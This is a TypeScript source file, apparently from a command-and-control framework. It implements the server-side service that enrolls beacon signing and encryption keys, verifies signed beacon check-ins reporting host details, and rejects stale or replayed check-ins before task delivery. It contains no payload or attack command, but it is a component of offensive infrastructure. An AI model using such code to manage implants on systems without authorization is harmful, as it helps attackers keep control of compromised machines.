import {
  canonicalJson,
  decodeBase64Url,
  ed25519KeyId,
  verifyEnvelope,
  type ChannelId,
  type CheckinPayload,
  type SignedEnvelope,
} from "@octoc2/shared";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import { sha256Hex, type OctoStore } from "../store/index.ts";
import { RejectedArtifactError } from "./ArtifactErrors.ts";

export type CheckinVerificationStatus =
  | "accepted"
  | "duplicate"
  | "stale_duplicate"
  | "gap";

export function checkinAuthorizesTaskDelivery(
  status: CheckinVerificationStatus,
): status is "accepted" | "gap" {
  return status === "accepted" || status === "gap";
}

export interface EnrollmentArtifact {
  version: 1;
  beaconId: string;
  encryptionPublicKey: string;
  signingPublicKey: string;
  signingKeyId: string;
  createdAt: string;
}

export class BeaconIdentityService {
  constructor(
    private readonly store: OctoStore,
    private readonly registry: BeaconRegistry,
    private readonly maxClockSkewMs = 5 * 60 * 1000,
    private readonly maxEnvelopeAgeMs = 30 * 60 * 1000,
  ) {
    if (
      !Number.isSafeInteger(maxClockSkewMs) ||
      maxClockSkewMs < 0
    ) {
      throw new Error("maxClockSkewMs must be a non-negative safe integer");
    }
    if (
      !Number.isSafeInteger(maxEnvelopeAgeMs) ||
      maxEnvelopeAgeMs <= 0
    ) {
      throw new Error("maxEnvelopeAgeMs must be a positive safe integer");
    }
  }

  async enroll(
    artifact: EnrollmentArtifact,
    provisionedBy = "operator-import",
  ): Promise<void> {
    if (
      artifact.version !== 1 ||
      !artifact.beaconId ||
      !artifact.encryptionPublicKey ||
      !artifact.signingPublicKey ||
      !artifact.signingKeyId
    ) {
      throw new Error("Invalid beacon enrollment artifact");
    }
    const createdAt = new Date(artifact.createdAt);
    if (!Number.isFinite(createdAt.getTime())) {
      throw new Error("Enrollment artifact has an invalid createdAt timestamp");
    }
    const encryptionPublicKey = await this.decodeEnrollmentKey(
      artifact.encryptionPublicKey,
      "X25519",
    );
    const signingPublicKey = await this.decodeEnrollmentKey(
      artifact.signingPublicKey,
      "Ed25519",
    );
    const derivedSigningKeyId = await ed25519KeyId(signingPublicKey);
    if (derivedSigningKeyId !== artifact.signingKeyId) {
      throw new Error(
        "Enrollment signingKeyId does not match the Ed25519 public key",
      );
    }

    const claimedIdentity = this.store.getIdentityKey(artifact.signingKeyId);
    if (
      claimedIdentity &&
      (
        claimedIdentity.beaconId !== artifact.beaconId ||
        claimedIdentity.publicKey !== artifact.signingPublicKey
      )
    ) {
      throw new Error(
        `Enrollment signing key ${artifact.signingKeyId} is already assigned to another beacon`,
      );
    }
    const existing = this.store.getBeacon(artifact.beaconId);
    if (
      existing &&
      existing.x25519PublicKey !== artifact.encryptionPublicKey
    ) {
      throw new Error(
        `Enrollment conflicts with the existing X25519 key for ${artifact.beaconId}`,
      );
    }
    const activeIdentity = this.store.getActiveIdentityKey(artifact.beaconId);
    if (
      activeIdentity &&
      (
        activeIdentity.keyId !== artifact.signingKeyId ||
        activeIdentity.publicKey !== artifact.signingPublicKey
      )
    ) {
      throw new Error(
        `Beacon ${artifact.beaconId} already has a different active signing key`,
      );
    }
    this.store.upsertBeacon({
      beaconId: artifact.beaconId,
      issueNumber: existing?.issueNumber ?? null,
      x25519PublicKey: artifact.encryptionPublicKey,
      hostname: existing?.hostname ?? "pre-enrolled",
      username: existing?.username ?? "pre-enrolled",
      os: existing?.os ?? "unknown",
      arch: existing?.arch ?? "unknown",
      firstSeen: existing?.firstSeen ?? artifact.createdAt,
      lastSeen: existing?.lastSeen ?? artifact.createdAt,
      status: existing?.status ?? "dormant",
      lastSeq: existing?.lastSeq ?? 0,
      activeTentacle: existing?.activeTentacle ?? null,
    });
    const result = this.store.provisionIdentityKey({
      keyId: artifact.signingKeyId,
      beaconId: artifact.beaconId,
      publicKey: artifact.signingPublicKey,
      provisionedBy,
      provisionedAt: artifact.createdAt,
    });
    if (result.status === "conflict") {
      throw new Error(
        `Beacon ${artifact.beaconId} already has a different active signing key`,
      );
    }
  }

  async verifyAndRegisterCheckin(
    payload: CheckinPayload,
    authenticatedBeaconId: string,
    tentacleId: ChannelId,
    issueNumber = 0,
  ): Promise<CheckinVerificationStatus> {
    if (payload.beaconId !== authenticatedBeaconId) {
      throw new RejectedArtifactError("credential does not match beaconId");
    }
    const identity = payload.identity;
    if (!identity || identity.kind !== "checkin") {
      throw new RejectedArtifactError("signed check-in envelope is required");
    }
    if (identity.signerId !== authenticatedBeaconId) {
      throw new RejectedArtifactError(
        "check-in signer does not match authenticated beacon",
      );
    }
    const envelopeDigest = sha256Hex(canonicalJson(identity));
    const hasExactAcceptedReceipt = (): boolean => {
      const receipt = this.store.getBeaconSequenceReceipt(
        authenticatedBeaconId,
        identity.sequence,
      );
      return receipt?.envelopeKind === "checkin" &&
        receipt.envelopeDigest === envelopeDigest;
    };
    let exactAcceptedDuplicate = hasExactAcceptedReceipt();
    let staleAcceptedDuplicate = false;
    try {
      this.assertFresh(identity);
    } catch (error) {
      // Another controller process may have accepted the same immutable
      // envelope after our first receipt lookup. Recheck before rejecting a
      // stale recovery attempt.
      exactAcceptedDuplicate ||= hasExactAcceptedReceipt();
      if (!exactAcceptedDuplicate) throw error;
      staleAcceptedDuplicate = true;
    }

    const enrolled = this.store.getBeacon(authenticatedBeaconId);
    if (!enrolled) {
      throw new RejectedArtifactError("beacon is not pre-enrolled");
    }
    if (enrolled.x25519PublicKey !== payload.publicKey) {
      throw new RejectedArtifactError(
        "encryption key replacement requires operator authorization",
      );
    }
    const key = this.store.getActiveIdentityKey(authenticatedBeaconId);
    if (!key || key.keyId !== identity.keyId) {
      throw new RejectedArtifactError(
        "check-in signing key is not the active enrolled key",
      );
    }

    const expectedPayload = {
      beaconId: payload.beaconId,
      encryptionPublicKey: payload.publicKey,
      signingPublicKey: key.publicKey,
      hostname: payload.hostname,
      username: payload.username,
      os: payload.os,
      arch: payload.arch,
      pid: payload.pid,
      checkinAt: payload.checkinAt,
    };
    let payloadMatches = false;
    try {
      payloadMatches =
        canonicalJson(identity.payload) === canonicalJson(expectedPayload);
    } catch (error) {
      throw new RejectedArtifactError(
        `invalid check-in envelope payload: ${errorMessage(error)}`,
      );
    }
    if (!payloadMatches) {
      throw new RejectedArtifactError(
        "check-in envelope does not match its transport payload",
      );
    }
    const publicKey = await decodeBase64Url(key.publicKey);
    if (!await verifyEnvelope(identity, publicKey)) {
      throw new RejectedArtifactError("invalid check-in signature");
    }

    if (exactAcceptedDuplicate) {
      this.registry.refreshFromStore(authenticatedBeaconId);
      return staleAcceptedDuplicate ? "stale_duplicate" : "duplicate";
    }

    const sequence = this.store.acceptBeaconCheckin({
      beaconId: authenticatedBeaconId,
      sequence: identity.sequence,
      envelopeDigest,
      issueNumber: issueNumber || enrolled.issueNumber || null,
      x25519PublicKey: payload.publicKey,
      hostname: payload.hostname,
      username: payload.username,
      os: payload.os,
      arch: payload.arch,
      activeTentacle: tentacleId,
    });
    if (sequence.status === "replay") {
      throw new RejectedArtifactError("replayed check-in");
    }
    if (sequence.status === "conflict") {
      throw new RejectedArtifactError("conflicting replayed check-in");
    }
    if (sequence.status === "unknown") {
      throw new RejectedArtifactError("beacon is not pre-enrolled");
    }
    this.registry.refreshFromStore(authenticatedBeaconId);
    if (sequence.status === "exact_duplicate") return "duplicate";
    return sequence.status === "gap" ? "gap" : "accepted";
  }

  private assertFresh(envelope: SignedEnvelope): void {
    const issuedAt = new Date(envelope.issuedAt).getTime();
    if (!Number.isFinite(issuedAt)) {
      throw new RejectedArtifactError("invalid envelope timestamp");
    }
    const now = Date.now();
    if (issuedAt > now + this.maxClockSkewMs) {
      throw new RejectedArtifactError(
        "envelope timestamp is too far in the future",
      );
    }
    if (issuedAt < now - this.maxEnvelopeAgeMs) {
      throw new RejectedArtifactError("check-in envelope is too old");
    }
  }

  private async decodeEnrollmentKey(
    encoded: string,
    algorithm: "X25519" | "Ed25519",
  ): Promise<Uint8Array> {
    let decoded: Uint8Array;
    try {
      decoded = await decodeBase64Url(encoded);
    } catch {
      throw new Error(
        `Enrollment ${algorithm} public key must be valid base64url`,
      );
    }
    if (decoded.length !== 32) {
      throw new Error(
        `Enrollment ${algorithm} public key must contain 32 bytes`,
      );
    }
    return decoded;
  }
}

function errorMessage(error: unknown): string {
  return error instanceof Error ? error.message : String(error);
}
